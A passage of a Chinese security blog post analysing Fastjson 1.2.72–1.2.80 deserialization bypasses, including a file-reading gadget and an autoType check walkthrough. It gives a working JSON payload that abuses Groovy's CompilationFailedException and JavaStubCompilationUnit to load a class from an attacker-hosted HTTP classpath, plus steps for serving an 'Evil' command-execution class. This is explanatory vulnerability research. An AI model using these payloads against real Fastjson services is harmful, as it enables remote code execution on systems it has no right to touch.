&#123;</span><br><span class="line">	<span class="type">Iterator</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.boms.iterator();</span><br><span class="line">	ByteOrderMark bom;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!var1.hasNext()) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		bom = (ByteOrderMark)var1.next();</span><br><span class="line">	&#125; <span class="keyword">while</span>(!<span class="built_in">this</span>.matches(bom));</span><br><span class="line">	<span class="keyword">return</span> bom;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">matches</span><span class="params">(ByteOrderMark bom)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bom.length(); ++i) &#123;</span><br><span class="line">	<span class="keyword">if</span> (bom.get(i) != <span class="built_in">this</span>.firstBytes[i]) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这段代码实现了一个BOM（字节顺序标记）检测器，用于从输入流中读取文件开头的若干字节，并与预定义的BOM签名列表（如UTF-8、UTF-16BE、UTF-16LE等）进行逐字节比对，以识别字符编码。代码首先缓存输入流的前N个字节（N取最大BOM长度），然后通过迭代器遍历所有候选BOM，使用<code>matches()</code>方法逐一匹配，一旦匹配成功就返回对应的<code>ByteOrderMark</code>对象；若全部不匹配则返回<code>null</code>。此外，如果检测到BOM且<code>include</code>标志为<code>false</code>，会调整内部索引以便后续读取时跳过BOM字节，避免将BOM作为文件内容处理</p>
+<p>原理就是通过遍历对比目标文件中字节码从而挨个字节获取文件内容</p>
+<p><code>org.apache.commons.io.input.ReaderInputStream</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ReaderInputStream</span><span class="params">(Reader reader, CharsetEncoder encoder, <span class="type">int</span> bufferSize)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>jdk.nashorn.api.scripting.URLReader</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">URLReader</span><span class="params">(URL url)</span></span><br></pre></td></tr></table></figure>
+
+<p> 参数为URL，可使用file jar http 等协议</p>
+<h2 id="1-2-72-Fastjson"><a href="#1-2-72-Fastjson" class="headerlink" title="1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80"></a>1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</h2><p>FastJSON1.2.80与1.2.68相比，ParserConfig#checkAutoType()添加了期望类黑名单，期望类在黑名单中则无法加载，若期望类及目标类不在黑名单中则可使用与1.2.68类似绕过方法绕过检测</p>
+<p>后面我们要用到的就是 <code>java.lang.Exception</code>  ，我们在ThrowableDeserializer那一部分最后提到了它，但没有说为什么可以</p>
+<p>其实和<code>java.lang.AutoCloseable</code>的原因一样，Fastjson 在加载 <code>TypeUtils</code> 类时，会在其静态代码块（<code>static</code> block）中预先注册一系列常见的 JDK 基础类型、包装类以及核心接口，以提高类型解析和反序列化时的性能。<code>java.lang.Exception</code>也被预加载了，所以它也可以通过检查</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785657120419-562ca2bd-026b-44d9-96f6-cddc23d9abeb.png"></p>
+<p>payload如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;unit&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="punctuation">,</span><span class="attr">&quot;classpathList&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://127.0.0.1:8080/&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>按照之前的流程，接下来会对<code>CompilationFailedException</code>进行实例化，并设置属性</p>
+<p><code>CompilationFailedException</code>能过检查的原因，也是之前我们提到的如下条件：</p>
+<p><code>CompilationFailedException</code>是<code>java.lang.Exception</code>的子类</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">expectClass不为空：</span><br><span class="line"><span class="number">1.</span> typeNmae和expectClass均不在denyHashCodes黑名单中（必须条件）</span><br><span class="line"><span class="number">2.</span> autoTypeSupport为<span class="literal"><span class="keyword">false</span></span>（默认为<span class="literal"><span class="keyword">false</span></span>）</span><br><span class="line"><span class="number">3.</span> expectClass在TypeUtils#mappings中</span><br><span class="line"><span class="number">4.</span> typeName不是ClassLoader、DataSource、RowSet的子类</span><br><span class="line"><span class="number">5.</span> expectClass不为<span class="literal"><span class="keyword">null</span></span>，且不为Object.class、Serializable.class、Cloneable.class、</span><br><span class="line">Closeable.class、EventListener.class、Iterable.class、Collection.class</span><br><span class="line"><span class="number">6.</span> typeName是expectClass的子类</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在1.2.73中，官方修改了 <code>JavaBeanDeserializer#createInstance()</code>中的逻辑</p>
+<p>在尝试将空的<code>&quot;unit&quot;:{}</code>赋值给<code>CompilationFailedException</code>的<code>unit</code>字段时，<code>fastjson</code>发现该字段的类型是<code>ProcessingUnit</code>，但值是空的JSON对象，类型不匹配。此时，它会调用<code>TypeUtils.cast</code>进行类型转换，这个过程会触发<code>getDeserializer</code>方法，将<code>ProcessingUnit</code>这个类本身及其反序列化器，存入到fastjson内部的<code>deserializers</code>缓存中</p>
+<p>那这下就又绕过了，我们在后续可以通过检查去加载<code>ProcessingUnit</code>这个类，我们在1.2.47也走过类似的流程</p>
+<p>那么第二个json先实例化<code>ProcessingUnit</code>这个类</p>
+<p>最后走到 <code>org.codehaus.groovy.transform.ASTTransformationVisitor#doAddGlobalTransforms()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addPhaseOperationsForGlobalTransforms</span><span class="params">(CompilationUnit</span></span><br><span class="line"><span class="params">																													compilationUnit, Map&lt;String, URL&gt; transformNames, <span class="type">boolean</span> isFirstScan)</span> &#123;</span><br><span class="line">	<span class="comment">//获取到被赋予远程classpath的GroovyClassLoader</span></span><br><span class="line">	<span class="type">GroovyClassLoader</span> <span class="variable">transformLoader</span> <span class="operator">=</span> compilationUnit.getTransformLoader();</span><br><span class="line">	<span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> transformNames.entrySet().iterator();</span><br><span class="line">	<span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">		Map.Entry&lt;String, URL&gt; entry = (Map.Entry)var4.next();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">//从远程加载class对象</span></span><br><span class="line">			Class&lt;?&gt; gTransClass =</span><br><span class="line">			transformLoader.loadClass((String)entry.getKey(), <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">			<span class="type">GroovyASTTransformation</span> <span class="variable">transformAnnotation</span> <span class="operator">=</span></span><br><span class="line">			(GroovyASTTransformation)gTransClass.getAnnotation(GroovyASTTransformation.class</span><br><span class="line">																												);</span><br><span class="line">			<span class="keyword">if</span> (transformAnnotation == <span class="literal">null</span>) &#123;</span><br><span class="line">				compilationUnit.getErrorCollector().addWarning(<span class="keyword">new</span></span><br><span class="line">																											 <span class="title class_">WarningMessage</span>(<span class="number">2</span>, <span class="string">&quot;Transform Class &quot;</span> + (String)entry.getKey() + <span class="string">&quot; is specified</span></span><br><span class="line"><span class="string">																																			as a global transform in &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="string">&quot; but it</span></span><br><span class="line"><span class="string">																																			is not annotated by &quot;</span> + GroovyASTTransformation.class.getName() + <span class="string">&quot; the global</span></span><br><span class="line"><span class="string">																																			transform associated with it may fail and cause the compilation to fail.&quot;</span>,</span><br><span class="line">																																			(CSTNode)<span class="literal">null</span>, (SourceUnit)<span class="literal">null</span>));</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ASTTransformation.class.isAssignableFrom(gTransClass)) &#123;</span><br><span class="line">				<span class="comment">//将远程类实例化</span></span><br><span class="line">				<span class="type">ASTTransformation</span> <span class="variable">instance</span> <span class="operator">=</span></span><br><span class="line">				(ASTTransformation)gTransClass.getDeclaredConstructor().newInstance();</span><br><span class="line">				<span class="keyword">if</span> (instance <span class="keyword">instanceof</span> CompilationUnitAware) &#123;</span><br><span class="line">					((CompilationUnitAware)instance).setCompilationUnit(compilationUnit);</span><br><span class="line">				&#125;</span><br><span class="line">				CompilationUnit.<span class="type">ISourceUnitOperation</span> <span class="variable">suOp</span> <span class="operator">=</span> (source) -&gt; &#123;</span><br><span class="line">					instance.visit(<span class="keyword">new</span> <span class="title class_">ASTNode</span>[]&#123;source.getAST()&#125;, source);</span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">if</span> (isFirstScan) &#123;</span><br><span class="line">					compilationUnit.addPhaseOperation(suOp,</span><br><span class="line">																						transformAnnotation.phase().getPhaseNumber());</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					compilationUnit.addNewPhaseOperation(suOp,</span><br><span class="line">																							 transformAnnotation.phase().getPhaseNumber());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				compilationUnit.getErrorCollector().addError(<span class="keyword">new</span></span><br><span class="line">																										 <span class="title class_">SimpleMessage</span>(<span class="string">&quot;Transform Class &quot;</span> + (String)entry.getKey() + <span class="string">&quot; specified at &quot;</span> +</span><br><span class="line">																																	 ((URL)entry.getValue()).toExternalForm() + <span class="string">&quot; is not an ASTTransformation.&quot;</span>,</span><br><span class="line">																																	 (ProcessingUnit)<span class="literal">null</span>));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">			<span class="type">Throwable</span> <span class="variable">t</span> <span class="operator">=</span> var10 <span class="keyword">instanceof</span> InvocationTargetException ?</span><br><span class="line">			var10.getCause() : var10;</span><br><span class="line">			compilationUnit.getErrorCollector().addError(<span class="keyword">new</span></span><br><span class="line">																									 <span class="title class_">SimpleMessage</span>(<span class="string">&quot;Could not instantiate global transform class &quot;</span> +</span><br><span class="line">																																 (String)entry.getKey() + <span class="string">&quot; specified at &quot;</span> +</span><br><span class="line">																																 ((URL)entry.getValue()).toExternalForm() + <span class="string">&quot; because of exception &quot;</span> +</span><br><span class="line">																																 ((Throwable)t).toString(), (ProcessingUnit)<span class="literal">null</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation 文件中写Evil，然后创建一个Evil类写自己的命令执行代码，然后起一个http服务即可</p>
+
+    </div>
+</article>
+
+<!-- ==========================================
+     自动生成右侧导航目录 (TOC) & 滚动监听脚本
+     ========================================== -->
+<script>
+(function() {
+    // 1. 原有的平滑滚动（针对文章内的锚点链接）
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+            if (!this.classList.contains('toc-link')) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if(target) target.scrollIntoView({ behavior: 'smooth' });
+            }
+        });
+    });
+
+    // 2. 初始化右侧导航
+    function initTOC() {
+        if (document.querySelector('#zimu-toc-container')) return;
+        
+        // 注意：这里改成了 Hexo 模板中定义的正文容器 id
+        const postBody = document.querySelector('#post-body');
+        if (!postBody) return; 
+        
+        // 抓取各级标题
+        const headings = postBody.querySelectorAll('h1, h2, h3, h4');
+        if (headings.length === 0) return;
+
+        // 创建目录容器
+        const tocContainer = document.createElement('div');
+        tocContainer.id = 'zimu-toc-container';
+        tocContainer.style.display = 'block'; 
+        
+        // 创建目录头部
+        const tocHeader = document.createElement('div');
+        tocHeader.className = 'toc-header';
+        tocHeader.innerText = 'Navigation';
+        tocContainer.appendChild(tocHeader);
+
+        const tocItems = [];
+
+        // 遍历并生成链接
+        headings.forEach((heading, index) => {
+            if (!heading.id) {
+                heading.id = 'zimu-heading-' + index;
+            }
+
+            const link = document.createElement('a');
+            link.href = '#' + heading.id;
+            link.className = 'toc-link';
+            link.innerText = heading.innerText || heading.textContent;
+            
+            // 计算缩进
+            const level = parseInt(heading.tagName.substring(1));
+            const indent = (level - 1) * 12;
+            link.style.marginLeft = `${indent}px`;
+
+            // 点击平滑滚动
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const topOffset = heading.getBoundingClientRect().top + window.scrollY - 80;
+                window.scrollTo({ top: topOffset, behavior: 'smooth' });
+                history.pushState(null, null, '#' + heading.id);
+            });
+
+            tocContainer.appendChild(link);
+            tocItems.push({ heading: heading, link: link });
+        });
+
+        document.body.appendChild(tocContainer);
+
+        // 滚动监听逻辑
+        const onScroll = () => {
+            let currentHeadingIndex = 0;
+            for (let i = 0; i < tocItems.length; i++) {
+                const rect = tocItems[i].heading.getBoundingClientRect();
+                if (rect.top <= 120) {
+                    currentHeadingIndex = i;
+                } else {
+                    break; 
+                }
+            }
+
+            tocItems.forEach((item, index) => {
+                if (index === currentHeadingIndex) {
+                    item.link.classList.add('active');
+                } else {
+                    item.link.classList.remove('active');
+                }
+            });
+        };
+
+        window.addEventListener('scroll', onScroll, { passive: true });
+        setTimeout(onScroll, 100); 
+    }
+
+    // 执行挂载
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initTOC);
+    } else {
+        initTOC();
+    }
+})();
+</script>
+    </main>
+
+</body>
+</html>
